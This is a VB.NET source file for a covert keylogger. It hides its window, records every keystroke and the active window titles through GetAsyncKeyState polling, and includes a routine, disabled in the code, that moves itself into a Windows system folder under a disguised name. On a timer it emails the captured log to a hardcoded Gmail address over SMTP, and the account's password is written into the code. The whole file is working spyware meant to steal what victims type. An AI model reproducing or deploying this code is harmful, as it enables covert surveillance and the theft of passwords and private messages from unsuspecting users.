Imports System.Net.Mail
Public Class Form1

    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16
    Dim result As Integer
    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        For i = 1 To 255
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                TextBox1.Text = TextBox1.Text + Chr(i)
            End If
        Next i
    End Sub
    Sub moveme()
        Dim mylocation As String = Application.StartupPath
        Dim newName As String = "str45.exe"
        My.Computer.FileSystem.MoveFile(mylocation & "\recordingkeys.exe", "C:\Windows\System32\catroot\" & newName, FileIO.UIOption.AllDialogs, FileIO.UICancelOption.ThrowException)
        Process.Start("C:\Windows\System32\catroot\" & newName)
        Me.Close()
        'change move location to somthing better like C:\Windows\System32\catroot
    End Sub
    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles Timer2.Tick
        For i = 1 To 130
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                If (GetAsyncKeyState(107)) Then
                    TextBox1.Text = TextBox1.Text + "+"

                ElseIf (GetAsyncKeyState(59)) Then
                    TextBox1.Text = TextBox1.Text + ";"

                ElseIf (GetAsyncKeyState(95)) Then
                    TextBox1.Text = TextBox1.Text + "_"

                ElseIf (GetAsyncKeyState(95)) Then
                    TextBox1.Text = TextBox1.Text + "_"

                ElseIf (GetAsyncKeyState(59)) Then
                    TextBox1.Text = TextBox1.Text + ";"

                ElseIf (GetAsyncKeyState(58)) Then
                    TextBox1.Text = TextBox1.Text + ":"

                ElseIf (GetAsyncKeyState(47)) Then
                    TextBox1.Text = TextBox1.Text + "/"

                ElseIf (GetAsyncKeyState(63)) Then
                    TextBox1.Text = TextBox1.Text + "?"

                ElseIf (GetAsyncKeyState(64)) Then
                    TextBox1.Text = TextBox1.Text + "@"

                ElseIf (GetAsyncKeyState(126)) Then
                    TextBox1.Text = TextBox1.Text + "~"

                ElseIf (GetAsyncKeyState(35)) Then
                    TextBox1.Text = TextBox1.Text + "#"

                ElseIf (GetAsyncKeyState(44)) Then
                    TextBox1.Text = TextBox1.Text + ","

                ElseIf (GetAsyncKeyState(60)) Then
                    TextBox1.Text = TextBox1.Text + "<"

                ElseIf (GetAsyncKeyState(62)) Then
                    TextBox1.Text = TextBox1.Text + ">"

                ElseIf (GetAsyncKeyState(124)) Then
                    TextBox1.Text = TextBox1.Text + "|"

                ElseIf (GetAsyncKeyState(48)) Then
                    TextBox1.Text = TextBox1.Text + "0"

                ElseIf (GetAsyncKeyState(49)) Then
                    TextBox1.Text = TextBox1.Text + "1"

                ElseIf (GetAsyncKeyState(50)) Then
                    TextBox1.Text = TextBox1.Text + "2"

                ElseIf (GetAsyncKeyState(51)) Then
                    TextBox1.Text = TextBox1.Text + "3"

                ElseIf (GetAsyncKeyState(52)) Then
                    TextBox1.Text = TextBox1.Text + "4"

                ElseIf (GetAsyncKeyState(53)) Then
                    TextBox1.Text = TextBox1.Text + "5"

                ElseIf (GetAsyncKeyState(54)) Then
                    TextBox1.Text = TextBox1.Text + "6"

                ElseIf (GetAsyncKeyState(55)) Then
                    TextBox1.Text = TextBox1.Text + "7"

                ElseIf (GetAsyncKeyState(56)) Then
                    TextBox1.Text = TextBox1.Text + "8"

                ElseIf (GetAsyncKeyState(57)) Then
                    TextBox1.Text = TextBox1.Text + "9"

                ElseIf (GetAsyncKeyState(65)) Then
                    TextBox1.Text = TextBox1.Text + "a"

                ElseIf (GetAsyncKeyState(66)) Then
                    TextBox1.Text = TextBox1.Text + "b"

                ElseIf (GetAsyncKeyState(67)) Then
                    TextBox1.Text = TextBox1.Text + "c"

                ElseIf (GetAsyncKeyState(68)) Then
                    TextBox1.Text = TextBox1.Text + "d"

                ElseIf (GetAsyncKeyState(69)) Then
                    TextBox1.Text = TextBox1.Text + "e"

                ElseIf (GetAsyncKeyState(70)) Then
                    TextBox1.Text = TextBox1.Text + "f"

                ElseIf (GetAsyncKeyState(71)) Then
                    TextBox1.Text = TextBox1.Text + "g"

                ElseIf (GetAsyncKeyState(72)) Then
                    TextBox1.Text = TextBox1.Text + "h"

                ElseIf (GetAsyncKeyState(73)) Then
                    TextBox1.Text = TextBox1.Text + "i"

                ElseIf (GetAsyncKeyState(74)) Then
                    TextBox1.Text = TextBox1.Text + "j"

                ElseIf (GetAsyncKeyState(75)) Then
                    TextBox1.Text = TextBox1.Text + "k"

                ElseIf (GetAsyncKeyState(76)) Then
                    TextBox1.Text = TextBox1.Text + "l"

                ElseIf (GetAsyncKeyState(77)) Then
                    TextBox1.Text = TextBox1.Text + "m"

                ElseIf (GetAsyncKeyState(78)) Then
                    TextBox1.Text = TextBox1.Text + "n"

                ElseIf (GetAsyncKeyState(79)) Then
                    TextBox1.Text = TextBox1.Text + "o"

                ElseIf (GetAsyncKeyState(80)) Then
                    TextBox1.Text = TextBox1.Text + "p"

                ElseIf (GetAsyncKeyState(81)) Then
                    TextBox1.Text = TextBox1.Text + "q"

                ElseIf (GetAsyncKeyState(82)) Then
                    TextBox1.Text = TextBox1.Text + "r"

                ElseIf (GetAsyncKeyState(83)) Then
                    TextBox1.Text = TextBox1.Text + "s"

                ElseIf (GetAsyncKeyState(84)) Then
                    TextBox1.Text = TextBox1.Text + "t"

                ElseIf (GetAsyncKeyState(85)) Then
                    TextBox1.Text = TextBox1.Text + "u"

                ElseIf (GetAsyncKeyState(86)) Then
                    TextBox1.Text = TextBox1.Text + "v"

                ElseIf (GetAsyncKeyState(87)) Then
                    TextBox1.Text = TextBox1.Text + "w"

                ElseIf (GetAsyncKeyState(88)) Then
                    TextBox1.Text = TextBox1.Text + "x"

                ElseIf (GetAsyncKeyState(89)) Then
                    TextBox1.Text = TextBox1.Text + "y"

                ElseIf (GetAsyncKeyState(90)) Then
                    TextBox1.Text = TextBox1.Text + "z"

                ElseIf (GetAsyncKeyState(8)) Then
                    TextBox1.Text = TextBox1.Text + "[Back]"

                ElseIf (GetAsyncKeyState(27)) Then
                    TextBox1.Text = TextBox1.Text + "[Esc]"

                ElseIf (GetAsyncKeyState(35)) Then
                    TextBox1.Text = TextBox1.Text + "[End]"

                ElseIf (GetAsyncKeyState(33)) Then
                    TextBox1.Text = TextBox1.Text + "[PageUp]"

                ElseIf (GetAsyncKeyState(34)) Then
                    TextBox1.Text = TextBox1.Text + "[Pagedown]"

                ElseIf (GetAsyncKeyState(36)) Then
                    TextBox1.Text = TextBox1.Text + "[Home]"

                ElseIf (GetAsyncKeyState(37)) Then
                    TextBox1.Text = TextBox1.Text + "[Left]"

                ElseIf (GetAsyncKeyState(38)) Then
                    TextBox1.Text = TextBox1.Text + "[Up]"

                ElseIf (GetAsyncKeyState(39)) Then
                    TextBox1.Text = TextBox1.Text + "[Right]"

                ElseIf (GetAsyncKeyState(40)) Then
                    TextBox1.Text = TextBox1.Text + "[Down]"

                ElseIf (GetAsyncKeyState(45)) Then
                    TextBox1.Text = TextBox1.Text + "[Ins]"

                ElseIf (GetAsyncKeyState(46)) Then
                    TextBox1.Text = TextBox1.Text + "[Del]"

                ElseIf (GetAsyncKeyState(144)) Then
                    TextBox1.Text = TextBox1.Text + "[NumLock]"

                ElseIf (GetAsyncKeyState(112)) Then
                    TextBox1.Text = TextBox1.Text + "[F1]"

                ElseIf (GetAsyncKeyState(113)) Then
                    TextBox1.Text = TextBox1.Text + "[F2]"

                ElseIf (GetAsyncKeyState(114)) Then
                    TextBox1.Text = TextBox1.Text + "[F3]"

                ElseIf (GetAsyncKeyState(115)) Then
                    TextBox1.Text = TextBox1.Text + "[F4]"

                ElseIf (GetAsyncKeyState(116)) Then
                    TextBox1.Text = TextBox1.Text + "[F5]"

                ElseIf (GetAsyncKeyState(117)) Then
                    TextBox1.Text = TextBox1.Text + "[F6]"

                ElseIf (GetAsyncKeyState(118)) Then
                    TextBox1.Text = TextBox1.Text + "[F7]"

                ElseIf (GetAsyncKeyState(119)) Then
                    TextBox1.Text = TextBox1.Text + "[F8]"

                ElseIf (GetAsyncKeyState(120)) Then
                    TextBox1.Text = TextBox1.Text + "[F9]"

                ElseIf (GetAsyncKeyState(121)) Then
                    TextBox1.Text = TextBox1.Text + "[F10]"

                ElseIf (GetAsyncKeyState(122)) Then
                    TextBox1.Text = TextBox1.Text + "[F11]"

                ElseIf (GetAsyncKeyState(123)) Then
                    TextBox1.Text = TextBox1.Text + "[F12]"

                ElseIf (GetAsyncKeyState(16)) Then
                    TextBox1.Text = TextBox1.Text + "[Shift]"

                ElseIf (GetAsyncKeyState(96)) Then
                    TextBox1.Text = TextBox1.Text + "0"

                ElseIf (GetAsyncKeyState(97)) Then
                    TextBox1.Text = TextBox1.Text + "1"

                ElseIf (GetAsyncKeyState(98)) Then
                    TextBox1.Text = TextBox1.Text + "2"

                ElseIf (GetAsyncKeyState(99)) Then
                    TextBox1.Text = TextBox1.Text + "3"

                ElseIf (GetAsyncKeyState(100)) Then
                    TextBox1.Text = TextBox1.Text + "4"

                ElseIf (GetAsyncKeyState(101)) Then
                    TextBox1.Text = TextBox1.Text + "5"

                ElseIf (GetAsyncKeyState(102)) Then
                    TextBox1.Text = TextBox1.Text + "6"

                ElseIf (GetAsyncKeyState(103)) Then
                    TextBox1.Text = TextBox1.Text + "7"

                ElseIf (GetAsyncKeyState(104)) Then
                    TextBox1.Text = TextBox1.Text + "8"

                ElseIf (GetAsyncKeyState(105)) Then
                    TextBox1.Text = TextBox1.Text + "9"

                ElseIf (GetAsyncKeyState(106)) Then
                    TextBox1.Text = TextBox1.Text + "*"

                ElseIf (GetAsyncKeyState(108)) Then
                    TextBox1.Text = TextBox1.Text + "" & vbCrLf
                ElseIf (GetAsyncKeyState(32)) Then
                    TextBox1.Text = TextBox1.Text + " "

                ElseIf (GetAsyncKeyState(109)) Then
                    TextBox1.Text = TextBox1.Text + "-"


                ElseIf (GetAsyncKeyState(110)) Then
                    TextBox1.Text = TextBox1.Text + "."

                ElseIf (GetAsyncKeyState(111)) Then
                    TextBox1.Text = TextBox1.Text + "/"

                ElseIf (GetAsyncKeyState(42)) Then
                    TextBox1.Text = TextBox1.Text + "[PrintScreen]"

                ElseIf (GetAsyncKeyState(43)) Then
                    TextBox1.Text = TextBox1.Text + "[Execute]"

                ElseIf (GetAsyncKeyState(43)) Then
                    TextBox1.Text = TextBox1.Text + "[Snapshot]"

                ElseIf (GetAsyncKeyState(41)) Then
                    TextBox1.Text = TextBox1.Text + "[Select]"

                ElseIf (GetAsyncKeyState(19)) Then
                    TextBox1.Text = TextBox1.Text + "[Pause]"

                ElseIf (GetAsyncKeyState(20)) Then
                    TextBox1.Text = TextBox1.Text + "[CapsLock]"

                ElseIf (GetAsyncKeyState(17)) Then
                    TextBox1.Text = TextBox1.Text + "[Ctrl]"

                ElseIf (GetAsyncKeyState(9)) Then
                    TextBox1.Text = TextBox1.Text + "[Tab]"

                ElseIf (GetAsyncKeyState(12)) Then
                    TextBox1.Text = TextBox1.Text + "[Clear]"

                ElseIf (GetAsyncKeyState(3)) Then
                    TextBox1.Text = TextBox1.Text + "[Cancel]"

                End If
            End If
        Next i
    End Sub

    Private Sub Form1_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.Visible = False
        Me.Hide()
        'If Application.StartupPath <> "C:\Windows\System32\catroot\" + "*" Then
        'moveme()
        'End If
    End Sub
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32
    Dim strin As String = Nothing
    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)
        Return MyStr
    End Function
    Private Sub Timer3_Tick(sender As System.Object, e As System.EventArgs) Handles Timer3.Tick
        Try
            Dim smtpServer As New SmtpClient()
            Dim mail As New MailMessage()
            smtpServer.Credentials = New Net.NetworkCredential("bigpapat101@gmail.com", "bigpapat")
            smtpServer.Port = 587 'gmail mail port
            smtpServer.Host = "smtp.gmail.com" ' smtp location
            smtpServer.EnableSsl = True
            mail = New MailMessage()
            mail.From = New MailAddress("bigpapat101@gmail.com") 'who is it from
            mail.To.Add("bigpapat101@gmail.com") 'who it is to
            mail.Subject = ("Log Of: " + My.Computer.Name)
            mail.Body = TextBox1.Text
            smtpServer.Send(mail)
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        If strin <> GetActiveWindowTitle() Then
            If GetActiveWindowTitle() = "" Then
            Else
                TextBox1.Text = TextBox1.Text + "=====[" & GetActiveWindowTitle() & "]=====" & vbNewLine
                strin = GetActiveWindowTitle()
            End If
        End If
    End Sub
End Class
